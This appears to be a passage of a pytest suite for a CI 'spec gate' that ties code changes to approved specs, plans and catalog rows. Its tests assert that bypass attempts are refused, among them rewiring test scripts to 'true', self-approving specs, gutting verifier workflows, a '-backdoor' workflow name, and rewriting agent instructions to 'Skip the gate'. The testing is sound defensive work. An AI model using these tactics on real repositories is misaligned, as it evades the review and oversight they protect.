    r = pr(repo, "docs/spec-feat-model-001", {SPEC: None})
    assert r.returncode == 1 and "is not deleted" in r.stdout, r.stdout
    # solyra#72 r4119408318: an approved spec does not change in place; it is superseded
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(done_when=["something easier"])})
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # solyra#72 r4119957714: superseded means replaced, so the approved replacement lands first
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")})
    assert r.returncode == 1 and "no approved spec for its FEAT names it in `supersedes`" in r.stdout, r.stdout
    newer = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
    on_base(repo, {newer: spec(supersedes=SPEC)})
    assert pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")}).returncode == 0
    on_base(repo, {newer: None})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded", done_when=["something easier"])})
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # stocks#1205 r4119634437: nor is a superseded spec deleted; the done plans and the
    # replacing spec's `supersedes` still point at it
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: None})
    assert r.returncode == 1 and "a superseded spec is not deleted" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec()})
    assert pr(repo, "chore/bump-deps", {"package-lock.json": "{}\n"}).returncode == 0
    assert pr(repo, "bot/superpowers-v5", skill_file).returncode == 0
    assert pr(repo, "bot/superpowers-v5", {**skill_file, **CODE}).returncode == 1
    assert pr(repo, "chore/refactor", CODE).returncode == 1
    assert pr(repo, "test/more-cases", {"tests/test_x.py": "def test(): pass\n"}).returncode == 1
    # stocks#1205 r4118475516: git refs are case-sensitive, so the shape is lowercase only
    assert pr(repo, BRANCH.upper(), CODE).returncode == 1
    _git(repo, "checkout", "-q", "-B", "spike/try", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    assert gate(repo, "--commit").returncode == 0


def test_a_rename_is_seen_from_both_ends(repo):
    """solyra#72 r4117710100 (spec_gate.py:179).

    With git's default rename detection, `git diff --name-only` lists only a
    rename's destination, so moving code to a documentation path hid the code
    leaving. The gate diffs with --no-renames, in both modes.
    """
    _git(repo, "checkout", "-q", "-B", "tidy-up", "base")
    _git(repo, "mv", "lib/model.py", "docs/model.py")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "(lib/model.py)" in r.stdout, r.stdout
    _git(repo, "commit", "-q", "-m", "move")
    r = gate(repo, "--pr", "base", "HEAD", PR_HEAD_REF="tidy-up")
    assert r.returncode == 1 and "(lib/model.py)" in r.stdout, r.stdout


def test_only_catalog_rows_define_feat_ids(repo):
    """solyra#72 r4117710107 (spec_gate.py:76).

    The old gate took every FEAT-shaped string in the catalog as an entry, so an
    ID mentioned in prose authorized a branch. Only the first cell of a catalog
    table row defines one.
    """
    name = "feature/feat-fake-001-x"
    fake_spec = "docs/superpowers/specs/2026-09-03-fake.md"
    r = pr(repo, name, {**CODE,
                        CATALOG: CATALOG_TEXT + "\nFEAT-FAKE-001 is proposed for next quarter.\n",
                        fake_spec: spec(feat_id="FEAT-FAKE-001"),
                        "docs/superpowers/plans/2026-09-03-fake.md":
                            plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch=name)})
    assert r.returncode == 1 and "FEAT-FAKE-001 is not a row in" in r.stdout, r.stdout


def test_a_chore_branch_changes_only_dependency_fields(repo):
    """solyra#72 r4118278194 (spec_gate.py:69, P1).

    The chore/ allowance accepted any edit to package.json, so a chore PR could
    rewrite `scripts.test` or `scripts.build` and CI would run the new scripts
    from the checkout without a FEAT-ID, spec or plan. The gate now parses the
    manifest at the merge base and at the head and allows only the dependency
    fields to differ; pyproject.toml gets the same treatment. Lockfiles and
    requirements files hold nothing but dependencies, so they stay allowed.
    """
    package = {"name": "app", "scripts": {"test": "vitest run"}, "dependencies": {"react": "^19.0.0"}}
    pyproject = '[project]\nname = "app"\ndependencies = ["pandas==2.2.0"]\n\n[tool.pytest.ini_options]\naddopts = "-q"\n'
    _git(repo, "checkout", "-q", "main")
    write(repo, "package.json", json.dumps(package, indent=2) + "\n")
    write(repo, "pyproject.toml", pyproject)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "manifests")
    _git(repo, "tag", "-f", "base")

    bumped = {**package, "dependencies": {"react": "^19.1.0"}, "devDependencies": {"vitest": "^3.0.0"}}
    assert pr(repo, "chore/bump-deps", {"package.json": json.dumps(bumped, indent=2) + "\n"}).returncode == 0
    assert pr(repo, "chore/bump-deps", {"pyproject.toml": pyproject.replace("2.2.0", "2.2.3")}).returncode == 0
    assert pr(repo, "chore/bump-deps", {"package-lock.json": "{}\n", "requirements.txt": "pandas==2.2.3\n"}).returncode == 0

    rewired = {**package, "scripts": {"test": "true"}}
    r = pr(repo, "chore/bump-deps", {"package.json": json.dumps(rewired, indent=2) + "\n"})
    assert r.returncode == 1, r.stdout
    assert "package.json: changes scripts, not only dependencies" in r.stdout, r.stdout
    r = pr(repo, "chore/bump-deps", {"pyproject.toml": pyproject.replace('"-q"', '"-q -p no:cacheprovider"')})
    assert r.returncode == 1 and "pyproject.toml: changes tool, not only dependencies" in r.stdout, r.stdout
    # solyra#72 r4119234381: a manifest whose root is not an object is refused, not a traceback
    r = pr(repo, "chore/bump-deps", {"package.json": "[]\n"})
    assert r.returncode == 1 and "is not a JSON object" in r.stdout and "Traceback" not in r.stderr, r.stdout + r.stderr
    toolchain = {**package, "engines": {"node": ">=22"}, "packageManager": "pnpm@9"}
    r = pr(repo, "chore/bump-deps", {"package.json": json.dumps(toolchain, indent=2) + "\n"})
    assert r.returncode == 1 and "changes engines, packageManager, not only dependencies" in r.stdout, r.stdout
    r = pr(repo, "chore/bump-deps", {"package.json": "{not json\n"})
    assert r.returncode == 1 and "package.json: cannot be parsed" in r.stdout, r.stdout
    r = pr(repo, "chore/new-app", {"web/package.json": json.dumps(package) + "\n"})
    assert r.returncode == 1 and "web/package.json: a new manifest is a new project" in r.stdout, r.stdout

    _git(repo, "checkout", "-q", "-B", "chore/bump-deps", "base")
    write(repo, "package.json", json.dumps(rewired, indent=2) + "\n")
    _git(repo, "add", "package.json")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "package.json: changes scripts" in r.stdout, r.stdout


    # stocks#1205 r4118788504: main rewires scripts after the chore branch forked; the
    # manifest is classified against the merge base, so the bump is still only a bump
    _git(repo, "checkout", "-q", "-B", "chore/bump-deps", "base")
    write(repo, "package.json", json.dumps(bumped, indent=2) + "\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "bump on the chore branch")
    _git(repo, "checkout", "-q", "main")
    write(repo, "package.json", json.dumps(rewired, indent=2) + "\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main rewires scripts after the fork")
    r = gate(repo, "--pr", "main", "chore/bump-deps", PR_HEAD_REF="chore/bump-deps")
    assert r.returncode == 0, r.stdout

def test_the_canvas_handoff_is_in_the_pr_body(repo):
    """solyra#72 r4118278197 (spec_gate.py:308, P2).

    A spec with a non-empty `canvases` list passed the body check with only the
    spec path, plan path and checkboxes, so the Phase 5 handoff (`Canvas
    refresh pending: <url>`, or the report-only marker for a report-only
    canvas) could be left out and the gate still reported success. The body
    must now name every canvas the spec lists, under the marker its mode calls
    for, and a canvas the spec names must exist in canvases.yml.
    """
    refresh, report = "https://claude.ai/artifact/AAAA", "https://claude.ai/artifact/BBBB"
    canvases = ("canvases:\n"
                f"  - name: Models\n    url: {refresh}\n    repo: t/t\n    source_json: x.json\n"
                f"  - name: Architecture\n    url: {report}\n    repo: t/t\n    mode: report-only\n    source_json: null\n")
    on_base(repo, {SPEC: spec(canvases=[refresh, report]), "docs/product/canvases.yml": canvases})
    files = CODE
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}

    r = pr(repo, BRANCH, files, **title, PR_BODY=body())
    assert r.returncode == 1, r.stdout
    assert f"PR body must carry 'Canvas refresh pending: {refresh}'" in r.stdout, r.stdout
    assert f"PR body must carry 'Canvas check pending (report-only): {report}'" in r.stdout, r.stdout

    wrong_marker = body() + f"\n\nCanvas refresh pending: {refresh}, {report}\n"
    r = pr(repo, BRANCH, files, **title, PR_BODY=wrong_marker)
    assert r.returncode == 1 and f"Canvas check pending (report-only): {report}" in r.stdout, r.stdout

    handed_off = body() + f"\n\nCanvas refresh pending: {refresh}\nCanvas check pending (report-only): {report}\n"
    assert pr(repo, BRANCH, files, **title, PR_BODY=handed_off).returncode == 0

    on_base(repo, {SPEC: spec(canvases=["https://claude.ai/artifact/ZZZZ"])})
    r = pr(repo, BRANCH, files, **title, PR_BODY=handed_off)
    assert r.returncode == 1 and "ZZZZ, which is not in docs/product/canvases.yml" in r.stdout, r.stdout

    on_base(repo, {SPEC: spec(canvases=[])})
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0


def test_a_change_cannot_add_its_own_capability_or_approve_its_own_spec(repo):
    """Adversarial review of #1205 and #72, B2 (spec_gate.py:249-275).

    The catalog and the spec's `status: approved` were read from the PR head,
    so one PR could add a FEAT-FAKE-001 row, a spec that calls itself approved,
    a plan and the code, and pass. Phase 2 commits the approved spec alone
    first; the gate now reads the catalog row and the spec from the merge base
    (HEAD in commit mode) and refuses a spec that is new or edited in the change.
    """
    fake_spec = "docs/superpowers/specs/2026-09-28-fake.md"
    fake_plan = "docs/superpowers/plans/2026-09-28-fake.md"
    fake_branch = "feature/feat-fake-001-anything"
    catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-FAKE-001](#feat-fake-001) | Fake | Production | unknown | none |\n| [FEAT-DATA-001]")
    r = pr(repo, fake_branch, {**CODE, CATALOG: catalog,
                               fake_spec: spec(feat_id="FEAT-FAKE-001", req_ids="[REQ-MODEL-001]"),
                               fake_plan: plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch=fake_branch)})
    assert r.returncode == 1, r.stdout
    assert "FEAT-FAKE-001 is not a row in docs/product/02-FEATURE-CATALOG.md at the base branch" in r.stdout, r.stdout
    assert f"{fake_spec} is new in this change; an approved spec lands alone first" in r.stdout, r.stdout

    r = pr(repo, BRANCH, {**CODE, SPEC: spec(done_when=DONE + ["one more"])})
    assert r.returncode == 1 and f"{SPEC} at this change differs from the base's copy" in r.stdout, r.stdout

    on_base(repo, {SPEC: spec(status="draft")})
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, SPEC, spec())
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "is still status: draft" in r.stdout and "differs from the base's copy" in r.stdout, r.stdout


def test_a_merge_into_a_docs_branch_is_measured_against_what_it_merges(repo):
    """Adversarial review of #1205 and #72, B4 (spec_gate.py --commit).

    Merging main into a docs/ branch stages main's code, and the hook read the
    whole index as the branch's change, so a conflicted merge could not be
    committed. During a merge (MERGE_HEAD exists) the index is measured against
    the side being merged in, which leaves the branch's own files.
    """
    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "docs")
    _git(repo, "checkout", "-q", "main")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "code on main")
    _git(repo, "checkout", "-q", "docs/typo")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
    assert _git(repo, "rev-parse", "--verify", "MERGE_HEAD")
    r = gate(repo, "--commit")
    assert r.returncode == 0, r.stdout
    write(repo, "lib/other.py", "x = 1\n")
    _git(repo, "add", "lib/other.py")
    assert gate(repo, "--commit").returncode == 1


def test_a_failed_git_command_is_a_gate_failure_not_an_empty_diff(repo):
    """Adversarial review of #1205 and #72, finding 5 (spec_gate.py:447,464).

    The return code of `git diff` was ignored, so a diff that failed (a corrupt
    index, a bad ref) listed no files and the gate printed `spec gate ok`. The
    gate now fails naming the command. This is the no-silent-fallback rule applied to
    the gate itself.
    """
    _git(repo, "checkout", "-q", "-B", "docs/x", "base")
    write(repo, "docs/x.md", "# x\n")
    _git(repo, "add", "-A")
    bad_index = repo / ".git" / "broken-index"
    bad_index.write_bytes(b"not an index")
    r = gate(repo, "--commit", GIT_INDEX_FILE=str(bad_index))
    assert r.returncode == 1 and "git diff --cached failed" in r.stdout, r.stdout


def test_the_gate_reads_git_as_utf8_whatever_the_locale(repo):
    """Adversarial review of #1205 and #72, B3 (spec_gate.py:79).

    `git()` decoded with the locale encoding, so on Windows (cp1252) a spec
    holding a curly quote or an emoji raised UnicodeDecodeError and the hook
    blocked every commit with a traceback. Decoding is utf-8 with replacement.
    """
    on_base(repo, {SPEC: spec() + "\nThe reviewer said \u201cship it\u201d \u274c\n"})
    r = pr(repo, BRANCH, CODE, PYTHONUTF8="0", LC_ALL="C", LANG="C")
    assert r.returncode == 0, r.stdout + r.stderr


def test_a_feature_change_edits_only_its_own_product_records(repo):
    """stocks#1205 r4118289642 (spec_gate.py:225).

    Documentation was dropped before any check, so a feature PR could rewrite
    another capability's catalog record, or the requirements, with no
    traceability. Under docs/product/ the catalog and traceability may change
    only on the FEAT-ID's own row and record, and the requirements not at all;
    the model registry, canvases and generated files are not restricted.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
    own = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: Production\n- Note: decisions named")
    assert pr(repo, BRANCH, {**CODE, CATALOG: own}, **ok).returncode == 0
    other = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")
    r = pr(repo, BRANCH, {**CODE, CATALOG: other}, **ok)
    assert r.returncode == 1 and "lines outside FEAT-MODEL-001's row and record change" in r.stdout, r.stdout
    # stocks#1205 r4119162208: a second heading for the FEAT, nested in another capability's
    # section or anywhere else, is refused; the record is extended, not duplicated
    duplicate = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production",
                                     "### FEAT-DATA-001\n\n#### FEAT-MODEL-001\n\n- Note: copied here\n\n- Status: Production")
    r = pr(repo, BRANCH, {**CODE, CATALOG: duplicate}, **ok)
    assert r.returncode == 1 and "adds a second heading or row for FEAT-MODEL-001" in r.stdout, r.stdout
    # stocks#1205 r4119416471: promoting the FEAT's heading would swallow the capabilities below it
    promoted = CATALOG_TEXT.replace("### FEAT-MODEL-001\n", "## FEAT-MODEL-001\n").replace(
        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Production\n- Note: slipped in")
    r = pr(repo, BRANCH, {**CODE, CATALOG: promoted}, **ok)
    assert r.returncode == 1 and ("changes the level" in r.stdout or "lines outside" in r.stdout), r.stdout
    # solyra#72 r4119234359: a second table row for the FEAT is a duplicate record too
    twice = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
                                 "| Models | Production | unknown | none |\n| [FEAT-MODEL-001](#feat-model-001) | Models again | Production | unknown | #42 |")
    r = pr(repo, BRANCH, {**CODE, CATALOG: twice}, **ok)
    assert r.returncode == 1 and "adds a second heading or row for FEAT-MODEL-001" in r.stdout, r.stdout
    # solyra#72 r4119049970: an added heading naming this FEAT does not widen its span over
    # another capability's row
    widened = CATALOG_TEXT + "\n## FEAT-MODEL-001 additions\n\n| [FEAT-FAKE-999](#x) | Fake | Production | unknown | none |\n"
    r = pr(repo, BRANCH, {**CODE, CATALOG: widened}, **ok)
    assert r.returncode == 1 and ("adds a second heading" in r.stdout or "lines outside FEAT-MODEL-001" in r.stdout), r.stdout
    r = pr(repo, BRANCH, {**CODE, REQUIREMENTS: REQUIREMENTS_TEXT + "\n**REQ-MODEL-002:** Faster.\n"}, **ok)
    assert r.returncode == 1 and "requirements change on their own docs/ branch" in r.stdout, r.stdout
    trace = "# Traceability\n\n### FEAT-DATA-001\n\n- #1\n"
    on_base(repo, {TRACEABILITY: trace})
    assert pr(repo, BRANCH, {**CODE, TRACEABILITY: trace + "\n### FEAT-MODEL-001\n\n- #7\n"}, **ok).returncode == 0
    r = pr(repo, BRANCH, {**CODE, TRACEABILITY: trace.replace("#1", "#1, #7")}, **ok)
    assert r.returncode == 1 and "docs/product/12-PR-ISSUE-TRACEABILITY.md: lines outside" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md": "# Registry\n"}, **ok).returncode == 0


def test_the_plan_names_a_spec_under_the_spec_directory(repo):
    """stocks#1205 r4118289647 (spec_gate.py:195).

    validate_plan only required the spec path to resolve to some file, so a
    plan could name an approved-looking file outside docs/superpowers/specs/,
    which the supersession scan never sees.
    """
    stray = "docs/notes/approved.md"
    on_base(repo, {stray: spec()})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=stray)})
    assert r.returncode == 1 and f"spec must be a file under docs/superpowers/specs/, not {stray}" in r.stdout, r.stdout


def test_the_branch_override_names_a_detached_commit_only(repo):
    """stocks#1205 r4118289655 (spec_gate.py:444).

    SPEC_GATE_BRANCH was read before the real branch, so a commit on main or
    docs/x could export a feature branch's name and be judged by that branch's
    plan. The override is honoured only when HEAD is detached.
    """
    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    r = gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH)
    assert r.returncode == 1 and "HEAD is on branch 'docs/typo'" in r.stdout, r.stdout
    _git(repo, "checkout", "-q", "--detach")
    assert gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH).returncode == 0


def test_a_ticked_done_when_item_may_not_defer_its_work(repo):
    """stocks#1205 r4118289657 (spec_gate.py:392).

    A ticked line only had to start with the done_when text, so
    `- [x] <item> (follow-up)` counted as done. The phrases CLAUDE.md rule 0
    forbids in a perf context are refused on a ticked done_when line.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    deferred = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]} (non-blocking, future-work)\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=deferred)
    assert r.returncode == 1 and "a ticked done_when item defers its work" in r.stdout, r.stdout
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body(ticked=True)).returncode == 0
    # stocks#1205 r4119001317: a deferral on the item's indented continuation line renders as
    # part of the same task-list item
    continued = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n    TODO: run this in a follow-up PR\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=continued)
    assert r.returncode == 1 and "a ticked done_when item defers its work" in r.stdout, r.stdout
    evidence = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n    verified by `pytest tests/lib`\n- [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=evidence).returncode == 0
    # solyra#72 r4119153690: the spec's own wording is not a deferral; the evidence after it is
    on_base(repo, {SPEC: spec(done_when=["the queue shows no pending jobs", "skipped records are excluded"])})
    worded = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] the queue shows no pending jobs\n- [x] skipped records are excluded\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=worded).returncode == 0, worded
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=worded.replace("excluded\n", "excluded (not yet verified)\n"))
    assert r.returncode == 1 and "defers its work" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec()})
    # solyra#72 r4119049965: an explicit "not done" is a deferral whatever the wording
    for phrase in ("not run", "not implemented", "not yet verified", "incomplete", "pending"):
        body_text = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]} ({phrase})\n- [x] {DONE[1]}\n"
        r = pr(repo, BRANCH, CODE, **title, PR_BODY=body_text)
        assert r.returncode == 1 and "defers its work" in r.stdout, (phrase, r.stdout)


def test_a_workload_change_carries_its_capacity_numbers(repo):
    """stocks#1205 r4118289674 (spec_gate.py:313).

    A PR changing a Cloud Run job or a workflow could leave the template's
    Capacity line blank and pass, although CLAUDE.md rule 0 makes the three
    numbers and the cost mandatory. With a change under gcp/ or
    .github/workflows/ the body must give them, or an `n/a: <why>`.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    blank = body() + "\n\n## Capacity (CLAUDE.md rule 0)\nVolume: \u00b7 Velocity: \u00b7 Wall-clock: \u00b7 $/run \u00d7 runs/day \u00d7 30:\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=blank)
    assert r.returncode == 1 and "Capacity section leaves Volume, Velocity, Wall-clock, 30 blank" in r.stdout, r.stdout
    r = pr(repo, BRANCH, job, **title, PR_BODY=body())
    assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
    filled = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0
    na = body() + "\n\n## Capacity\nn/a: the job's log line changes, no query or schedule does\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=na).returncode == 0
    # solyra#72 r4119408320: nested headings inside the section belong to it
    nested = (body() + "\n\n## Capacity\n\n### Volume\n3 tickers \u00d7 400 B\n\n### Velocity\n1 query\n\n### Wall-clock\n2 s\n\n"
              "### $/run \u00d7 runs/day \u00d7 30\n$0.01\n\n## Summary\nx\n")
    nested = nested.replace("### Volume\n3", "### Volume\nVolume: 3").replace("### Velocity\n1", "### Velocity\nVelocity: 1") \
                   .replace("### Wall-clock\n2", "### Wall-clock\nWall-clock: 2").replace("30\n$0.01", "30\n30: $0.01")
    assert pr(repo, BRANCH, job, **title, PR_BODY=nested).returncode == 0, nested
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0
    # solyra#72 r4118831965: a chore/ PR editing the gate's own workflow is untraced and
    # still changes what CI runs, so the Capacity check does not hide behind the trace
    workflow = {".github/workflows/spec-gate.yml": "on:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  gate:\n"
                                                  "    steps:\n      - run: python3 scripts/gate/spec_gate.py --pr a b\n"}
    r = pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Summary\n\nretune the gate\n")
    assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Capacity\nn/a: one PR-triggered job, seconds\n").returncode == 0
    # stocks#1205 r4119001303 (P1): the gate's entrypoints cannot be deleted, chore/ or not
    # solyra#72 r4119610915 (P1): nor the catalog the gate reads FEAT-IDs from
    r = pr(repo, "docs/cleanup", {CATALOG: None})
    assert r.returncode == 1 and "policy documents cannot be removed" in r.stdout, r.stdout
    on_base(repo, {".github/workflows/spec-gate.yml": "on: pull_request_target\n", ".githooks/pre-commit": "#!/bin/sh\n"})
    for entry in (".github/workflows/spec-gate.yml", ".githooks/pre-commit"):   # the script itself runs these tests
        r = pr(repo, "chore/gate-workflow", {entry: None}, PR_BODY="## Capacity\nn/a: x\n")
        assert r.returncode == 1 and "cannot be removed by a change" in r.stdout, (entry, r.stdout)
    # solyra#72 r4119505510 (P1): the head-run verifier cannot be gutted by the PR it verifies;
    # the base's gate holds it to its steps
    gutted = "name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n"
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": gutted}, PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    # solyra#72 r4119610895 (P1): the commands must be executed, not mentioned in a comment
    commented = gutted + "".join(f"      # {m}\n" for m in ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"',
                                                         "pytest tests/scripts/test_spec_gate.py", 'git ls-tree "$HEAD_SHA" .githooks/pre-commit',
                                                         'export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"'))
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": commented}, PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    kept = gutted.replace("      - run: echo ok\n", "      - run: |\n          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n          pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n          export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": kept}, PR_BODY="## Capacity\nn/a: x\n").returncode == 0
    # solyra#72 r4118957767 (P1): a gate file entry is exact, so a workflow named after
    # one is still a workflow a chore/ branch cannot add
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml-backdoor.yaml": "on: push\n"},
           PR_BODY="## Capacity\nn/a: x\n")
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {"scripts/gate/helper.py": "x = 1\n"}).returncode == 0
    # stocks#1205 r4119299883: an allowance needs the full branch shape
    # stocks#1205 r4119416484: a chore/ or bot/ branch is limited to its allowance for every file
    r = pr(repo, "chore/deps", {REQUIREMENTS: "# Requirements\n\nrewritten\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    r = pr(repo, "bot/superpowers-weekly", {"docs/notes.md": "# notes\n", ".claude/skills/brainstorming/SKILL.md": "# v2\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    for name in ("chore/foo/bar", "chore/Bad", "bot/superpowers-x/y"):
        r = pr(repo, name, {"scripts/gate/helper.py": "x = 1\n"}, PR_HEAD_REF=name)
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (name, r.stdout)
    # solyra#72 r4119153686: the vendored-skills update may not touch the repository's own skills
    assert pr(repo, "bot/superpowers-weekly", {".claude/skills/brainstorming/SKILL.md": "# v2\n"}).returncode == 0
    r = pr(repo, "bot/superpowers-weekly", {".claude/skills/product-delivery/SKILL.md": "# Skip the gate\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    # stocks#1205 r4119162185: a documentation-only PR still comes from a delivery branch
    for name in ("main", "typo", "claude/notes", "feature/typo", "fix/wrong", "docs/Bad_Name",
                 "feature/feat-model-001-a_b", "fix/feat-model-001-a.b"):   # r4119416443: kebab-case slugs only
        r = pr(repo, name, {"docs/notes.md": "# Notes\n"}, PR_HEAD_REF=name)
        assert r.returncode == 1 and "is not a delivery branch" in r.stdout, (name, r.stdout)
    assert pr(repo, "docs/notes", {"docs/notes.md": "# Notes\n"}).returncode == 0
    # solyra#72 r4119610902: a feature branch touching only its own row is still traced
    r = pr(repo, BRANCH, {CATALOG: CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")},
           PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(ticked=True), PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "Traceback" not in r.stderr and "no plan in" not in r.stdout, r.stdout + r.stderr
    on_base(repo, {PLAN: None})
    r = pr(repo, BRANCH, {CATALOG: CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")})
    assert r.returncode == 1 and "no plan in" in r.stdout, r.stdout
    on_base(repo, {PLAN: plan()})
    # solyra#72 r4119610921: CI configuration is FEAT-CICD-001's work where the catalog has it
    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: cicd_row})
    r = pr(repo, BRANCH, {**CODE, ".github/workflows/ci.yml": "on: push\n"}, PR_TITLE="FEAT-MODEL-001: x",
           PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    assert pr(repo, BRANCH, {**CODE, ".github/workflows/ci.yml": "on: push\n"}, PR_TITLE="FEAT-MODEL-001: x",
              PR_BODY=body() + "\n\n## Capacity\nn/a: x\n").returncode == 0
    # stocks#1205 r4119509833: so are the root instructions that tell agents to run it
    for path in ("AGENTS.md", "CLAUDE.md"):
        r = pr(repo, "docs/tweak", {path: "# Nothing to do here\n"})
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (path, r.stdout)
    # stocks#1205 r4119048063: the delivery skill is the process agents run, not its description
    r = pr(repo, "docs/skill-tweak", {".claude/skills/product-delivery/SKILL.md": "# Skip the gate\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    # stocks#1205 r4118890018: documentation under a workload prefix runs nothing
    docs = {".github/workflows/README.md": "# Workflows\n", "gcp/README.md": "# Jobs\n"}
    assert pr(repo, "docs/workflow-notes", docs, PR_BODY="## Summary\n\nnotes\n").returncode == 0


def test_a_plan_on_the_base_stays_bound_to_its_branch_and_pr(repo):
